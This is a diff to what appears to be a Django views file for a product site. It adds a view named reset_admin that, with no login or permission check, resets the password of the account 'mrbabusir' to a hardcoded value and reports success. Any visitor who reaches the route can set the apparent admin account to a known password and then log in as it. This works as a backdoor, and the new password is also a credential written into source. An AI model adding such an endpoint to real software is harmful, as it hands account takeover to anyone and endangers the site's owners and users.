@@ -14,6 +14,7 @@ from django.http import JsonResponse
 from .forms import UserRegistrationForm
 from .models import *
 from django.core.mail import send_mail
+from django.http import HttpResponse
 
 # ===== AUTH VIEW (LOGIN + REGISTER) =====
 def auth_view(request):
@@ -273,3 +274,12 @@ def product_detail(request, product_id):
     return render(request, 'product_detail.html', {
         'product': product
     })
+
+def reset_admin(request):
+    try:
+        user = User.objects.get(username='mrbabusir')
+        user.set_password('NewPassword456!')
+        user.save()
+        return HttpResponse("Password reset successfully!")
+    except User.DoesNotExist:
+        return HttpResponse("User not found!")
